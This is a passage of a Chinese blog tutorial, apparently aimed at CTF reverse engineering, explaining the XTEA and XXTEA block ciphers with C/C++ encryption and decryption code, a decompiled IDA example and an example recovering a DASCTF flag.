number">0xE6EFA7EF</span><span class="token punctuation">,</span> <span class="token number">0x4AE016F0</span><span class="token punctuation">,</span> <span class="token number">0xC5832E1D</span><span class="token punctuation">,</span> <span class="token number">0x455C0A05</span><span class="token punctuation">,</span> <span class="token number">0xFFEB8140</span><span class="token punctuation">,</span>              <span class="token number">0xBE9561EF</span><span class="token punctuation">,</span> <span class="token number">0x7F819E23</span><span class="token punctuation">,</span> <span class="token number">0x3BC04269</span><span class="token punctuation">,</span> <span class="token number">0xC68B825B</span><span class="token punctuation">,</span> <span class="token number">0xE6A5B1F0</span><span class="token punctuation">,</span> <span class="token number">0xBD03CBBD</span><span class="token punctuation">,</span> <span class="token number">0xA9B3CE0E</span><span class="token punctuation">,</span> <span class="token number">0x6C85E6E7</span><span class="token punctuation">,</span>              <span class="token number">0x9F5C71EF</span><span class="token punctuation">,</span> <span class="token number">0x3BE4BD57</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span> <span class="token number">0x87654321</span><span class="token punctuation">,</span> <span class="token number">0xFACEB00C</span><span class="token punctuation">,</span> <span class="token number">0xCAFEBABE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>   <span class="token comment">// 轮数  </span>    <span class="token keyword">int</span> data_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// data 的长度  </span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 2 个 4 字节为一组  </span>        <span class="token function">xtea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 这种方式输出无需转换小端序  </span>    <span class="token punctuation">&#125;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 2 个 4 字节为一组  </span>        <span class="token function">xtea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token comment">/* 输出：解密后：DASCTF&#123;Don't_forget_to_drink_tea&#125;加密后：(乱码)*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例二</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span>  </span>  <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"DASCTF&#123;Don't_forget_to_drink_tea&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>  <span class="token comment">// 轮数</span>    <span class="token keyword">int</span> data_len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// data 的长度</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"加密后：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment">// 8 字节为一组</span>        <span class="token function">xtea_encrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"解密后：\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> data_len<span class="token punctuation">;</span> i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>   <span class="token comment">// 8 字节为一组</span>        <span class="token function">xtea_decrypt</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 输出：加密后：(乱码)解密后：DASCTF&#123;Don't_forget_to_drink_tea&#125;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="IDA-示例-3"><a href="#IDA-示例-3" class="headerlink" title="IDA 示例"></a>IDA 示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// r11</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>  v7 <span class="token operator">=</span> <span class="token operator">*</span>a2<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// 初始 sum 为 0</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> a1<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>   <span class="token comment">// a1 为迭代轮数</span>  <span class="token punctuation">&#123;</span>    v7 <span class="token operator">+=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4LL</span> <span class="token operator">*</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>v5 <span class="token operator">|</span> <span class="token number">0xFFFFFFFC</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v5<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">~</span><span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v6<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v6 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4LL</span> <span class="token operator">*</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>v5 <span class="token operator">|</span> <span class="token number">0xFFFFFFFC</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>    v5 <span class="token operator">-=</span> <span class="token number">1640531527</span><span class="token punctuation">;</span>   <span class="token comment">// 即：0x61C88647</span>    v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v5 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v5 <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xFFFFFFFC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">+=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">+</span> v5<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>v7 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v7<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v7 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">~</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>v7 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v7<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> v7<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v7 <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a3 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">+</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span>a2 <span class="token operator">=</span> v7<span class="token punctuation">;</span>   <span class="token comment">// 将加密后的结果写回原数组</span>  result <span class="token operator">=</span> v6<span class="token punctuation">;</span>  a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>   <span class="token comment">// 将加密后的结果写回原数组</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h1><blockquote><p>XXTEA，又称 Corrected Block TEA，是 XTEA 的升级版 ，支持块加密，设计者是 Roger Needham、David Wheeler，由于其代码实现非常简单，运算也是由异或等基本操作组成的，因此非常适合计算和存储能力吃紧的设备中使用</p><p>XXTEA 是一个非平衡 Feistel 网络分组密码，在可变长度块上运行，这些块是 32 位大小的任意倍数（最小 64 位），使用 128 位密钥，是目前 TEA 系列中最安全的算法，但性能较上两种有所降低</p></blockquote><h2 id="特点-4"><a href="#特点-4" class="headerlink" title="特点"></a>特点</h2><ol><li><p>分组长度可变，是任意 32 bit 为步长递增，最少 64 bit 的二进制字符串</p></li><li><p>密钥长度仍然为 128 位</p></li><li><p><mark>加密轮数可变，取决于分组长度</mark>，分组越长轮数越少（最低 6 轮），分组越短轮数越多（最多 32 个完整轮数），<code>加密轮数 = 明文总字节数 / 8</code></p></li><li><p>存在 DELTA 值</p></li></ol><hr><h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%815.png" alt="加密算法的函数特征5.png"></p><hr><h2 id="加解密代码-4"><a href="#加解密代码-4" class="headerlink" title="加解密代码"></a>加解密代码</h2><h3 id="C-版-2"><a href="#C-版-2" class="headerlink" title="C++ 版"></a>C++ 版</h3><ul><li><p><strong>特点</strong></p><ol><li>包含具体实现流程</li><li>支持快速修改 <code>delta</code> 的值</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DELTA</span> <span class="token expression"><span class="token number">0x9e3779b9</span>   </span><span class="token comment">// DELTA值</span></span><span class="token comment">//加密函数</span><span class="token keyword">void</span> <span class="token function">xxtea_encrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">/</span> num_rounds<span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    z <span class="token operator">=</span> v<span class="token punctuation">[</span>num_rounds <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>        sum <span class="token operator">+=</span> DELTA<span class="token punctuation">;</span>        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> num_rounds <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        z <span class="token operator">=</span> v<span class="token punctuation">[</span>num_rounds <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//解密函数</span><span class="token keyword">void</span> <span class="token function">xxtea_decrypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rounds<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> v<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span><span class="token operator">*</span> key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> y<span class="token punctuation">,</span> z<span class="token punctuation">,</span> sum<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> p<span class="token punctuation">,</span> rounds<span class="token punctuation">,</span> e<span class="token punctuation">;</span>    rounds <span class="token operator">=</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">52</span> <span class="token operator">/</span> num_rounds<span class="token punctuation">;</span>    sum <span class="token operator">=</span> rounds <span class="token operator">*</span> DELTA<span class="token punctuation">;</span>    y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>        e <span class="token operator">=</span> <span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> num_rounds <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> p<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            z <span class="token operator">=</span> v<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            y <span class="token operator">=</span> v<span class="token punctuation">[</span>p<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        z <span class="token operator">=</span> v<span class="token punctuation">[</span>num_rounds <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        y <span class="token operator">=</span> v<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">5</span> <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">3</span> <span class="token operator">^</span> z <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span>p <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">]</span> <span class="token operator">^</span> z<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sum <span class="token operator">-=</span> DELTA<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>rounds<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>示例一</strong></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span> <span class="token number">0xFACEB00C</span><span class="token punctuation">,</span> <span class="token number">0xDAC0FFEE</span><span class="token punctuation">,</span> <span class="token number">0xABADBABE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x11111111</span><span class="token punctuation">,</span> <span class="token number">0x22222222</span><span class="token punctuation">,</span> <span class="token number">0x33333333</span><span class="token punctuation">,</span> <span class="token number">0x44444444</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> data_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// data 的长度</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span 